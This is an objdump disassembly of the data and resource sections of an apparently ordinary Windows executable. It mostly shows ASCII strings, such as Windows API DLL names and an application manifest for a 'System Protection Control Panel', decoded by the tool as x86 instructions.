  4033d0:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  4033d7:	outs   dx,DWORD PTR ds:[esi]
  4033d8:	arpl   WORD PTR [ebp+0x73],sp
  4033db:	jae    0x4033dd
  4033dd:	add    BYTE PTR [ecx+0x70],ah
  4033e0:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  4033ea:	outs   dx,DWORD PTR ds:[esi]
  4033eb:	jb     0x403452
  4033ed:	sub    eax,0x636e7973
  4033f2:	push   0x2d316c2d
  4033f7:	xor    ch,BYTE PTR ds:0x6c642e30
  4033fd:	ins    BYTE PTR es:[edi],dx
  4033fe:	add    BYTE PTR [eax],al
  403400:	popa   
  403401:	jo     0x40346c
  403403:	sub    eax,0x772d736d
  403408:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  40340f:	sub    eax,0x636f7270
  403414:	gs jae 0x40348a
  403417:	je     0x403481
  403419:	jb     0x403480
  40341b:	popa   
  40341c:	fs jae 0x40344c
  40341f:	ins    BYTE PTR es:[edi],dx
  403420:	xor    DWORD PTR ds:0x2e322d31,ebp
  403426:	fs ins BYTE PTR es:[edi],dx
  403428:	ins    BYTE PTR es:[edi],dx
  403429:	add    BYTE PTR [ecx+0x70],ah
  40342c:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  403436:	outs   dx,DWORD PTR ds:[esi]
  403437:	jb     0x40349e
  403439:	sub    eax,0x6f727265
  40343e:	jb     0x4034a8
  403440:	popa   
  403441:	outs   dx,BYTE PTR ds:[esi]
  403442:	fs ins BYTE PTR es:[edi],dx
  403444:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  40344b:	xor    DWORD PTR ds:0x6c642e31,ebp
  403451:	ins    BYTE PTR es:[edi],dx
  403452:	add    BYTE PTR [eax],al
  403454:	popa   
  403455:	jo     0x4034c0
  403457:	sub    eax,0x772d736d
  40345c:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  403463:	sub    eax,0x7262696c
  403468:	popa   
  403469:	jb     0x4034e4
  40346b:	ins    BYTE PTR es:[edi],dx
  40346c:	outs   dx,DWORD PTR ds:[esi]
  40346d:	popa   
  40346e:	fs gs jb 0x40349f
  403472:	ins    BYTE PTR es:[edi],dx
  403473:	xor    DWORD PTR ds:0x2e302d32,ebp
  403479:	fs ins BYTE PTR es:[edi],dx
  40347b:	ins    BYTE PTR es:[edi],dx
  40347c:	add    BYTE PTR [eax],al
  40347e:	popa   
  40347f:	jo     0x4034ea
  403481:	sub    eax,0x772d736d
  403486:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  40348d:	sub    eax,0x666f7270
  403492:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  40349a:	sub    eax,0x6c642e30
  40349f:	ins    BYTE PTR es:[edi],dx
  4034a0:	add    BYTE PTR [eax],al
  4034a2:	popa   
  4034a3:	jo     0x40350e
  4034a5:	sub    eax,0x772d736d
  4034aa:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  4034b1:	sub    eax,0x69737973
  4034b6:	outs   dx,BYTE PTR ds:[esi]
  4034b7:	outs   dx,WORD PTR ds:[esi]
  4034b9:	sub    eax,0x322d316c
  4034be:	sub    eax,0x6c642e31
  4034c3:	ins    BYTE PTR es:[edi],dx
	...

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    DWORD PTR [eax],eax
  40400e:	add    al,0x0
  404010:	sub    BYTE PTR [ebx],al
  404012:	add    BYTE PTR [eax-0x7fffffc8],al
  404018:	add    eax,DWORD PTR [eax]
  40401a:	add    BYTE PTR [eax],al
  40401c:	push   eax
  40401d:	add    BYTE PTR [eax],al
  40401f:	or     BYTE PTR [esi],0x0
  404022:	add    BYTE PTR [eax],al
  404024:	mov    al,0x0
  404026:	add    BYTE PTR [eax+0x10],al
  40402c:	enter  0x0,0x80
  404030:	sbb    BYTE PTR [eax],al
  404032:	add    BYTE PTR [eax],al
  404034:	loopne 0x404036
  404036:	add    BYTE PTR [eax+0x0],al
	...
  404044:	add    BYTE PTR [eax],al
  404046:	add    DWORD PTR [eax],eax
  404048:	add    DWORD PTR [eax],eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	clc    
  40404d:	add    BYTE PTR [eax],al
  40404f:	add    BYTE PTR [eax],0x0
	...
  40405e:	or     al,BYTE PTR [eax]
  404060:	add    DWORD PTR [eax],eax
  404062:	add    BYTE PTR [eax],al
  404064:	adc    BYTE PTR [ecx],al
  404066:	add    BYTE PTR [eax+0x2],al
  40406c:	sub    BYTE PTR [ecx],al
  40406e:	add    BYTE PTR [eax+0x3],al
  404074:	inc    eax
  404075:	add    DWORD PTR [eax],eax
  404077:	add    BYTE PTR [eax+eax*1],0x0
  40407b:	add    BYTE PTR [eax+0x1],bl
  40407e:	add    BYTE PTR [eax+0x5],al
  404084:	jo     0x404087
  404086:	add    BYTE PTR [eax+0x6],al
  40408c:	mov    BYTE PTR [ecx],al
  40408e:	add    BYTE PTR [eax+0x7],al
  404094:	mov    al,ds:0x8800001
  404099:	add    BYTE PTR [eax],al
  40409b:	add    BYTE PTR [eax+0x9800001],bh
  4040a1:	add    BYTE PTR [eax],al
  4040a3:	add    al,dl
  4040a5:	add    DWORD PTR [eax],eax
  4040a7:	or     BYTE PTR [edx],0x0
  4040aa:	add    BYTE PTR [eax],al
  4040ac:	call   0xc040b2
	...
  4040bd:	add    BYTE PTR [ecx],al
  4040bf:	add    BYTE PTR [ecx+0x1f],al
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	add    BYTE PTR [edx],al
  4040c6:	add    BYTE PTR [eax+0x0],al
	...
  4040d4:	add    BYTE PTR [eax],al
  4040d6:	add    DWORD PTR [eax],eax
  4040d8:	add    DWORD PTR [eax],eax
  4040da:	add    BYTE PTR [eax],al
  4040dc:	sbb    BYTE PTR [edx],al
  4040de:	add    BYTE PTR [eax+0x0],al
	...
  4040ec:	add    BYTE PTR [eax],al
  4040ee:	add    DWORD PTR [eax],eax
  4040f0:	add    DWORD PTR [eax],eax
  4040f2:	add    BYTE PTR [eax],al
  4040f4:	xor    BYTE PTR [edx],al
  4040f6:	add    BYTE PTR [eax+0x0],al
	...
  404104:	add    BYTE PTR [eax],al
  404106:	add    DWORD PTR [eax],eax
  404108:	or     DWORD PTR [eax+eax*1],eax
  40410b:	add    BYTE PTR [eax+0x2],cl
	...
  40411e:	add    DWORD PTR [eax],eax
  404120:	or     DWORD PTR [eax+eax*1],eax
  404123:	add    BYTE PTR [eax+0x2],bl
	...
  404136:	add    DWORD PTR [eax],eax
  404138:	or     DWORD PTR [eax+eax*1],eax
  40413b:	add    BYTE PTR [eax+0x2],ch
	...
  40414e:	add    DWORD PTR [eax],eax
  404150:	or     DWORD PTR [eax+eax*1],eax
  404153:	add    BYTE PTR [eax+0x2],bh
	...
  404166:	add    DWORD PTR [eax],eax
  404168:	or     DWORD PTR [eax+eax*1],eax
  40416b:	add    BYTE PTR [eax+0x2],cl
	...
  40417d:	add    BYTE PTR [ecx],al
  40417f:	add    BYTE PTR [ecx],cl
  404181:	add    al,0x0
  404183:	add    BYTE PTR [eax+0x2],bl
	...
  404195:	add    BYTE PTR [ecx],al
  404197:	add    BYTE PTR [ecx],cl
  404199:	add    al,0x0
  40419b:	add    BYTE PTR [eax+0x2],ch
	...
  4041ad:	add    BYTE PTR [ecx],al
  4041af:	add    BYTE PTR [ecx],cl
  4041b1:	add    al,0x0
  4041b3:	add    BYTE PTR [eax+0x2],bh
	...
  4041c5:	add    BYTE PTR [ecx],al
  4041c7:	add    BYTE PTR [ecx],cl
  4041c9:	add    al,0x0
  4041cb:	add    al,cl
  4041cd:	add    al,BYTE PTR [eax]
	...
  4041db:	add    BYTE PTR [eax],al
  4041dd:	add    BYTE PTR [ecx],al
  4041df:	add    BYTE PTR [ecx],cl
  4041e1:	add    al,0x0
  4041e3:	add    al,bl
  4041e5:	add    al,BYTE PTR [eax]
	...
  4041f3:	add    BYTE PTR [eax],al
  4041f5:	add    BYTE PTR [ecx],al
  4041f7:	add    BYTE PTR [ecx],cl
  4041f9:	add    al,0x0
  4041fb:	add    al,ch
  4041fd:	add    al,BYTE PTR [eax]
	...
  40420b:	add    BYTE PTR [eax],al
  40420d:	add    BYTE PTR [ecx],al
  40420f:	add    BYTE PTR [ecx],cl
  404211:	add    al,0x0
  404213:	add    al,bh
  404215:	add    al,BYTE PTR [eax]
	...
  404223:	add    BYTE PTR [eax],al
  404225:	add    BYTE PTR [ecx],al
  404227:	add    BYTE PTR [ecx],cl
  404229:	add    al,0x0
  40422b:	add    BYTE PTR [eax],cl
  40422d:	add    eax,DWORD PTR [eax]
	...
  40423b:	add    BYTE PTR [eax],al
  40423d:	add    BYTE PTR [ecx],al
  40423f:	add    BYTE PTR [ecx],cl
  404241:	add    al,0x0
  404243:	add    BYTE PTR [eax],bl
  404245:	add    eax,DWORD PTR [eax]
  404247:	add    BYTE PTR [eax+0x66],dh
  40424a:	add    DWORD PTR [eax],eax
  40424c:	rol    BYTE PTR [eax],1
	...
  404256:	add    BYTE PTR [eax],al
  404258:	and    BYTE PTR [eax+0x0],cl
  40425b:	add    BYTE PTR [eax+0x6],ch
	...
  404266:	add    BYTE PTR [eax],al
  404268:	mov    BYTE PTR [esi+0x0],cl
  40426b:	add    al,ch
  40426d:	add    al,BYTE PTR [eax]
	...
  404277:	add    BYTE PTR [eax+0x51],dh
  40427a:	add    BYTE PTR [eax],al
  40427c:	sub    BYTE PTR [ecx],al
	...
  404286:	add    BYTE PTR [eax],al
  404288:	cwde   
  404289:	push   edx
  40428a:	add    BYTE PTR [eax],al
  40428c:	test   al,0xe
	...
  404296:	add    BYTE PTR [eax],al
  404298:	inc    eax
  404299:	popa   
  40429a:	add    BYTE PTR [eax],al
  40429c:	test   al,0x8
	...
  4042a6:	add    BYTE PTR [eax],al
  4042a8:	call   0x68404316
  4042ad:	add    eax,0x0
  4042b2:	add    BYTE PTR [eax],al
  4042b4:	add    BYTE PTR [eax],al
  4042b6:	add    BYTE PTR [eax],al
  4042b8:	push   eax
  4042b9:	outs   dx,DWORD PTR ds:[esi]
  4042ba:	add    BYTE PTR [eax],al
  4042bc:	call   0x404378
  4042c1:	add    BYTE PTR [eax],al
  4042c3:	add    BYTE PTR [eax],al
  4042c5:	add    BYTE PTR [eax],al
  4042c7:	add    BYTE PTR [eax],bh
  4042c9:	daa    
  4042ca:	add    DWORD PTR [eax],eax
  4042cc:	test   al,0x25
	...
  4042d6:	add    BYTE PTR [eax],al
  4042d8:	loopne 0x404326
  4042da:	add    DWORD PTR [eax],eax
  4042dc:	test   al,0x10
	...
  4042e6:	add    BYTE PTR [eax],al
  4042e8:	mov    BYTE PTR [ebp+0x1],bl
  4042eb:	add    BYTE PTR [eax+0x4],ch
	...
  4042f6:	add    BYTE PTR [eax],al
  4042f8:	lock popa 
  4042fa:	add    DWORD PTR [eax],eax
  4042fc:	xchg   edx,eax
	...
  404305:	add    BYTE PTR [eax],al
  404307:	add    BYTE PTR [eax-0x17fffe9e],cl
  40430d:	add    eax,DWORD PTR [eax]
	...
  404317:	add    BYTE PTR [eax],dh
  404319:	inc    ebx
  40431a:	add    BYTE PTR [eax],al
  40431c:	jmp    0x404322
	...
  404326:	add    BYTE PTR [eax],al
  404328:	add    eax,DWORD PTR [eax]
  40432a:	dec    ebp
  40432b:	add    BYTE PTR [ebp+0x0],dl
  40432e:	dec    ecx
  40432f:	add    BYTE PTR [edi+edi*1],bh
  404332:	js     0x4043a1
  404334:	ins    BYTE PTR es:[edi],dx
  404335:	and    BYTE PTR [esi+0x65],dh
  404338:	jb     0x4043ad
  40433a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404341:	xor    BYTE PTR [edx],ah
  404343:	and    BYTE PTR [ebp+0x6e],ah
  404346:	arpl   WORD PTR [edi+0x64],bp
  404349:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  404350:	inc    esi
  404351:	sub    eax,0x73202238
  404356:	je     0x4043b9
  404358:	outs   dx,BYTE PTR ds:[esi]
  404359:	fs popa 
  40435b:	ins    BYTE PTR es:[edi],dx
  40435c:	outs   dx,DWORD PTR ds:[esi]
  40435d:	outs   dx,BYTE PTR ds:[esi]
  40435e:	gs cmp eax,0x73657922
  404364:	and    bh,BYTE PTR [edi]
  404366:	ds or  eax,0x2d213c0a
  40436c:	sub    eax,0x706f4320
  404371:	jns    0x4043e5
  404373:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40437a:	sub    DWORD PTR [eax],esp
  40437c:	dec    ebp
  40437d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404384:	je     0x4043a6
  404386:	inc    ebx
  404387:	outs   dx,DWORD PTR ds:[esi]
  404388:	jb     0x4043fa
  40438a:	outs   dx,DWORD PTR ds:[esi]
  40438b:	jb     0x4043ee
  40438d:	je     0x4043f8
  40438f:	outs   dx,DWORD PTR ds:[esi]
  404390:	outs   dx,BYTE PTR ds:[esi]
  404391:	and    BYTE PTR ds:0xa0d3e2d,ch
  404397:	cmp    al,0x61
  404399:	jae    0x40440e
  40439b:	gs ins DWORD PTR es:[edi],dx
  40439d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4043a1:	js     0x404410
  4043a3:	ins    BYTE PTR es:[edi],dx
  4043a4:	outs   dx,BYTE PTR ds:[esi]
  4043a5:	jae    0x4043e4
  4043a7:	and    dh,BYTE PTR [ebp+0x72]
  4043aa:	outs   dx,BYTE PTR ds:[esi]
  4043ab:	cmp    dh,BYTE PTR [ebx+0x63]
  4043ae:	push   0x73616d65
  4043b3:	sub    eax,0x7263696d
  4043b8:	outs   dx,DWORD PTR ds:[esi]
  4043b9:	jae    0x40442a
  4043bb:	data16 je 0x4043eb
  4043be:	arpl   WORD PTR [edi+0x6d],bp
  4043c1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043c4:	ins    DWORD PTR es:[edi],dx
  4043c5:	cs jbe 0x4043f9
  4043c8:	and    ah,BYTE PTR [eax]
  4043ca:	and    BYTE PTR [eax+0x6d],bh
  4043cd:	ins    BYTE PTR es:[edi],dx
  4043ce:	outs   dx,BYTE PTR ds:[esi]
  4043cf:	jae    0x40440b
  4043d1:	popa   
  4043d2:	jae    0x404441
  4043d4:	jbe    0x404409
  4043d6:	cmp    eax,0x6e727522
  4043db:	cmp    dh,BYTE PTR [ebx+0x63]
  4043de:	push   0x73616d65
  4043e3:	sub    eax,0x7263696d
  4043e8:	outs   dx,DWORD PTR ds:[esi]
  4043e9:	jae    0x40445a
  4043eb:	data16 je 0x40441b
  4043ee:	arpl   WORD PTR [edi+0x6d],bp
  4043f1:	cmp    ah,BYTE PTR [ecx+0x73]
  4043f4:	ins    DWORD PTR es:[edi],dx
  4043f5:	cs jbe 0x40442b
  4043f8:	and    ah,BYTE PTR [eax]
  4043fa:	ins    DWORD PTR es:[edi],dx
  4043fb:	popa   
  4043fc:	outs   dx,BYTE PTR ds:[esi]
  4043fd:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  404404:	jb     0x404479
  404406:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40440d:	xor    BYTE PTR [edx],ah
  40440f:	ds or  eax,0x73613c0a
  404415:	jae    0x40447c
  404417:	ins    DWORD PTR es:[edi],dx
  404418:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40441c:	fs outs dx,BYTE PTR gs:[esi]
  40441f:	je     0x40448a
  404421:	je     0x40449c
  404423:	or     eax,0x7270090a
  404428:	outs   dx,DWORD PTR ds:[esi]
  404429:	arpl   WORD PTR [ebp+0x73],sp
  40442c:	jae    0x40449d
  40442e:	jb     0x404471
  404430:	jb     0x404495
  404432:	push   0x63657469
  404437:	je     0x4044ae
  404439:	jb     0x4044a0
  40443b:	cmp    eax,0x36387822
  404440:	and    cl,BYTE PTR ds:0x6576090a
  404446:	jb     0x4044bb
  404448:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40444f:	xor    DWORD PTR [esi],ebp
  404451:	xor    BYTE PTR [esi],ch
  404453:	xor    BYTE PTR [edx],ah
  404455:	or     eax,0x616e090a
  40445a:	ins    DWORD PTR es:[edi],dx
  40445b:	gs cmp eax,0x63694d22
  404461:	jb     0x4044d2
  404463:	jae    0x4044d4
  404465:	data16 je 0x404496
  404468:	push   edi
  404469:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  404470:	push   ebx
  404471:	jns    0x4044e6
  404473:	je     0x4044da
  404475:	ins    DWORD PTR es:[edi],dx
  404476:	push   eax
  404477:	jb     0x4044e8
  404479:	jo     0x4044e0
  40447b:	jb     0x4044f1
  40447d:	imul   esp,DWORD PTR [ebp+0x73],0x706d6f43
  404484:	jne    0x4044fa
  404486:	gs jb  0x4044d7
  404489:	popa   
  40448a:	ins    DWORD PTR es:[edi],dx
  40448b:	and    ah,BYTE PTR gs:[eax]
  40448e:	je     0x404509
  404490:	jo     0x4044f7
  404492:	cmp    eax,0x6e697722
  404497:	xor    esi,DWORD PTR [edx]
  404499:	and    ah,BYTE PTR [eax]
  40449b:	das    
  40449c:	ds or  eax,0x65643c0a
  4044a2:	jae    0x404507
  4044a4:	jb     0x40450f
  4044a6:	jo     0x40451c
  4044a8:	imul   ebp,DWORD PTR [edi+0x6e],0x7379533e
  4044af:	je     0x404516
  4044b1:	ins    DWORD PTR es:[edi],dx
  4044b2:	and    BYTE PTR [eax+0x72],dl
  4044b5:	outs   dx,DWORD PTR ds:[esi]
  4044b6:	jo     0x40451d
  4044b8:	jb     0x40452e
  4044ba:	imul   esp,DWORD PTR [ebp+0x73],0x6e6f4320
  4044c1:	je     0x404535
  4044c3:	outs   dx,DWORD PTR ds:[esi]
  4044c4:	ins    BYTE PTR es:[edi],dx
  4044c5:	and    BYTE PTR [eax+0x61],dl
  4044c8:	outs   dx,BYTE PTR ds:[esi]
  4044c9:	gs ins BYTE PTR es:[edi],dx
  4044cb:	cmp    al,0x2f
  4044cd:	fs gs jae 0x404534
  4044d1:	jb     0x40453c
  4044d3:	jo     0x404549
  4044d5:	imul   ebp,DWORD PTR [edi+0x6e],0x3c0a0d3e
  4044dc:	fs gs jo 0x404545
  4044e0:	outs   dx,BYTE PTR ds:[esi]
  4044e1:	fs outs dx,BYTE PTR gs:[esi]
  4044e4:	arpl   WORD PTR [ecx+0x3e],di
  4044e7:	or     eax,0x2020200a
  4044ec:	and    BYTE PTR [esp+eiz*2],bh
  4044ef:	gs jo  0x404557
  4044f2:	outs   dx,BYTE PTR ds:[esi]
  4044f3:	fs outs dx,BYTE PTR gs:[esi]
  4044f6:	je     0x404539
  4044f8:	jae    0x40456d
  4044fa:	gs ins DWORD PTR es:[edi],dx
  4044fc:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404500:	or     eax,0x2020200a
  404505:	and    BYTE PTR [eax],ah
  404507:	and    BYTE PTR [eax],ah
  404509:	and    BYTE PTR [ecx+eiz*2],bh
  40450c:	jae    0x404581
  40450e:	gs ins DWORD PTR es:[edi],dx
  404510:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  404514:	fs outs dx,BYTE PTR gs:[esi]
  404517:	je     0x404582
  404519:	je     0x404594
  40451b:	or     eax,0x2020200a
  404520:	and    BYTE PTR [eax],ah
  404522:	and    BYTE PTR [eax],ah
  404524:	and    BYTE PTR [eax],ah
  404526:	and    BYTE PTR [eax],ah
  404528:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40452c:	gs cmp eax,0x6e697722
  404532:	xor    esi,DWORD PTR [edx]
  404534:	and    cl,BYTE PTR ds:0x2020200a
  40453a:	and    BYTE PTR [eax],ah
  40453c:	and    BYTE PTR [eax],ah
  40453e:	and    BYTE PTR [eax],ah
  404540:	and    BYTE PTR [eax],ah
  404542:	and    BYTE PTR [esi+0x61],ch
  404545:	ins    DWORD PTR es:[edi],dx
  404546:	gs cmp eax,0x63694d22
  40454c:	jb     0x4045bd
  40454e:	jae    0x4045bf
  404550:	data16 je 0x404581
  404553:	push   edi
  404554:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40455b:	inc    ebx
  40455c:	outs   dx,DWORD PTR ds:[esi]
  40455d:	ins    DWORD PTR es:[edi],dx
  40455e:	ins    DWORD PTR es:[edi],dx
  40455f:	outs   dx,DWORD PTR ds:[esi]
  404560:	outs   dx,BYTE PTR ds:[esi]
  404561:	sub    eax,0x746e6f43
  404566:	jb     0x4045d7
  404568:	ins    BYTE PTR es:[edi],dx
  404569:	jae    0x40458d
  40456b:	or     eax,0x2020200a
  404570:	and    BYTE PTR [eax],ah
  404572:	and    BYTE PTR [eax],ah
  404574:	and    BYTE PTR [eax],ah
  404576:	and    BYTE PTR [eax],ah
  404578:	and    BYTE PTR [esi+0x65],dh
  40457b:	jb     0x4045f0
  40457d:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  404584:	xor    BYTE PTR [esi],ch
  404586:	xor    BYTE PTR [esi],ch
  404588:	xor    BYTE PTR [edx],ah
  40458a:	or     eax,0x2020200a
  40458f:	and    BYTE PTR [eax],ah
  404591:	and    BYTE PTR [eax],ah
  404593:	and    BYTE PTR [eax],ah
  404595:	and    BYTE PTR [eax],ah
  404597:	and    BYTE PTR [eax+0x75],dh
  40459a:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40459e:	dec    ebx
  40459f:	gs jns 0x4045f6
  4045a2:	outs   dx,DWORD PTR ds:[esi]
  4045a3:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4045a7:	and    dh,BYTE PTR [esi]
  4045a9:	xor    eax,0x36623539
  4045ae:	xor    al,0x31
  4045b0:	xor    al,0x34
  4045b2:	arpl   WORD PTR [ebx+0x66],sp
  4045b5:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  4045b9:	or     eax,0x2020200a
  4045be:	and    BYTE PTR [eax],ah
  4045c0:	and    BYTE PTR [eax],ah
  4045c2:	and    BYTE PTR [eax],ah
  4045c4:	and    BYTE PTR [eax],ah
  4045c6:	and    BYTE PTR [eax+0x72],dh
  4045c9:	outs   dx,DWORD PTR ds:[esi]
  4045ca:	arpl   WORD PTR [ebp+0x73],sp
  4045cd:	jae    0x40463e
  4045cf:	jb     0x404612
  4045d1:	jb     0x404636
  4045d3:	push   0x63657469
  4045d8:	je     0x40464f
  4045da:	jb     0x404641
  4045dc:	cmp    eax,0x36387822
  4045e1:	and    cl,BYTE PTR ds:0x2020200a
  4045e7:	and    BYTE PTR [eax],ah
  4045e9:	and    BYTE PTR [eax],ah
  4045eb:	and    BYTE PTR [edi],ch
  4045ed:	ds or  eax,0x2020200a
  4045f3:	and    BYTE PTR [edi+ebp*1],bh
  4045f6:	fs gs jo 0x40465f
  4045fa:	outs   dx,BYTE PTR ds:[esi]
  4045fb:	fs outs dx,BYTE PTR gs:[esi]
  4045fe:	je     0x404641
  404600:	jae    0x404675
  404602:	gs ins DWORD PTR es:[edi],dx
  404604:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404608:	or     eax,0x642f3c0a
  40460d:	gs jo  0x404675
  404610:	outs   dx,BYTE PTR ds:[esi]
  404611:	fs outs dx,BYTE PTR gs:[esi]
  404614:	arpl   WORD PTR [ecx+0x3e],di
  404617:	or     eax,0x72743c0a
  40461c:	jne    0x404691
  40461e:	je     0x404669
  404620:	outs   dx,BYTE PTR ds:[esi]
  404621:	outs   dx,WORD PTR ds:[esi]
  404623:	and    BYTE PTR [eax+0x6d],bh
  404626:	ins    BYTE PTR es:[edi],dx
  404627:	outs   dx,BYTE PTR ds:[esi]
  404628:	jae    0x404667
  40462a:	and    dh,BYTE PTR [ebp+0x72]
  40462d:	outs   dx,BYTE PTR ds:[esi]
  40462e:	cmp    dh,BYTE PTR [ebx+0x63]
  404631:	push   0x73616d65
  404636:	sub    eax,0x7263696d
  40463b:	outs   dx,DWORD PTR ds:[esi]
  40463c:	jae    0x4046ad
  40463e:	data16 je 0x40466e
  404641:	arpl   WORD PTR [edi+0x6d],bp
  404644:	cmp    ah,BYTE PTR [ecx+0x73]
  404647:	ins    DWORD PTR es:[edi],dx
  404648:	cs jbe 0x40467e
  40464b:	and    bh,BYTE PTR [esi]
  40464d:	or     eax,0x2020200a
  404652:	and    BYTE PTR [ebx+esi*2],bh
  404655:	arpl   WORD PTR gs:[ebp+0x72],si
  404659:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  404661:	and    BYTE PTR [eax],ah
  404663:	and    BYTE PTR [eax],ah
  404665:	and    BYTE PTR [eax],ah
  404667:	cmp    al,0x72
  404669:	gs jno 0x4046e1
  40466c:	gs jae 0x4046e3
  40466f:	gs fs push eax
  404672:	jb     0x4046dd
  404674:	jbe    0x4046df
  404676:	ins    BYTE PTR es:[edi],dx
  404677:	gs addr16 gs jae 0x4046ba
  40467c:	or     eax,0x2020200a
  404681:	and    BYTE PTR [eax],ah
  404683:	and    BYTE PTR [eax],ah
  404685:	and    BYTE PTR [eax],ah
  404687:	and    BYTE PTR [eax],ah
  404689:	and    BYTE PTR [edx+esi*2],bh
  40468c:	gs jno 0x404704
  40468f:	gs jae 0x404706
  404692:	gs fs inc ebp
  404695:	js     0x4046fc
  404697:	arpl   WORD PTR [ebp+0x74],si
  40469a:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4046a1:	ins    BYTE PTR es:[edi],dx
  4046a2:	or     eax,0x2020200a
  4046a7:	and    BYTE PTR [eax],ah
  4046a9:	and    BYTE PTR [eax],ah
  4046ab:	and    BYTE PTR [eax],ah
  4046ad:	and    BYTE PTR [eax],ah
  4046af:	and    BYTE PTR [eax],ah
  4046b1:	and    BYTE PTR [eax],ah
  4046b3:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4046b7:	gs ins BYTE PTR es:[edi],dx
  4046b9:	cmp    eax,0x71657222
  4046be:	jne    0x404729
  4046c0:	jb     0x404727
  4046c2:	inc    ecx
  4046c3:	fs ins DWORD PTR es:[edi],dx
  4046c5:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  4046cc:	je     0x40473d
  4046ce:	jb     0x4046f2
  4046d0:	or     eax,0x2020200a
  4046d5:	and    BYTE PTR [eax],ah
  4046d7:	and    BYTE PTR [eax],ah
  4046d9:	and    BYTE PTR [eax],ah
  4046db:	and    BYTE PTR [eax],ah
  4046dd:	and    BYTE PTR [eax],ah
  4046df:	and    BYTE PTR [eax],ah
  4046e1:	and    BYTE PTR [ebp+0x69],dh
  4046e4:	inc    ecx
  4046e5:	arpl   WORD PTR [ebx+0x65],sp
  4046e8:	jae    0x40475d
  4046ea:	cmp    eax,0x6c616622
  4046ef:	jae    0x404756
  4046f1:	and    cl,BYTE PTR ds:0x2020200a
  4046f7:	and    BYTE PTR [eax],ah
  4046f9:	and    BYTE PTR [eax],ah
  4046fb:	and    BYTE PTR [eax],ah
  4046fd:	and    BYTE PTR [eax],ah
  4046ff:	and    BYTE PTR [edi],ch
  404701:	ds or  eax,0x2020200a
  404707:	and    BYTE PTR [eax],ah
  404709:	and    BYTE PTR [eax],ah
  40470b:	and    BYTE PTR [edi+ebp*1],bh
  40470e:	jb     0x404775
  404710:	jno    0x404787
  404712:	gs jae 0x404789
  404715:	gs fs push eax
  404718:	jb     0x404783
  40471a:	jbe    0x404785
  40471c:	ins    BYTE PTR es:[edi],dx
  40471d:	gs addr16 gs jae 0x404760
  404722:	or     eax,0x2020200a
  404727:	and    BYTE PTR [edi+ebp*1],bh
  40472a:	jae    0x404791
  40472c:	arpl   WORD PTR [ebp+0x72],si
  40472f:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  404737:	je     0x4047ab
  404739:	jne    0x4047ae
  40473b:	je     0x404786
  40473d:	outs   dx,BYTE PTR ds:[esi]
  40473e:	outs   dx,WORD PTR ds:[esi]
  404740:	ds or  eax,0x73613c0a
  404746:	ins    DWORD PTR es:[edi],dx
  404747:	jbe    0x40477c
  404749:	cmp    ah,BYTE PTR [ecx+0x70]
  40474c:	jo     0x4047ba
  40474e:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404755:	ds or  eax,0x2020200a
  40475b:	cmp    al,0x61
  40475d:	jae    0x4047cc
  40475f:	jbe    0x404794
  404761:	cmp    dh,BYTE PTR [edi+0x69]
  404764:	outs   dx,BYTE PTR ds:[esi]
  404765:	outs   dx,DWORD PTR fs:[esi]
  404767:	ja     0x4047dc
  404769:	push   ebx
  40476a:	gs je  0x4047e1
  40476d:	imul   ebp,DWORD PTR [esi+0x67],0x6d782073
  404774:	ins    BYTE PTR es:[edi],dx
  404775:	outs   dx,BYTE PTR ds:[esi]
  404776:	jae    0x4047b5
  404778:	and    ch,BYTE PTR [eax+0x74]
  40477b:	je     0x4047ed
  40477d:	cmp    ch,BYTE PTR [edi]
  40477f:	das    
  404780:	jae    0x4047e5
  404782:	push   0x73616d65
  404787:	cs ins DWORD PTR es:[edi],dx
  404789:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404790:	je     0x4047c0
  404792:	arpl   WORD PTR [edi+0x6d],bp
  404795:	das    
  404796:	push   ebx
  404797:	dec    ebp
  404798:	dec    ecx
  404799:	das    
  40479a:	xor    dh,BYTE PTR [eax]
  40479c:	xor    BYTE PTR ds:0x6e69572f,dh
  4047a2:	outs   dx,DWORD PTR fs:[esi]
  4047a4:	ja     0x404819
  4047a6:	push   ebx
  4047a7:	gs je  0x40481e
  4047aa:	imul   ebp,DWORD PTR [esi+0x67],0xd3e2273
  4047b1:	or     ah,BYTE PTR [eax]
  4047b3:	and    BYTE PTR [eax],ah
  4047b5:	and    BYTE PTR [eax],ah
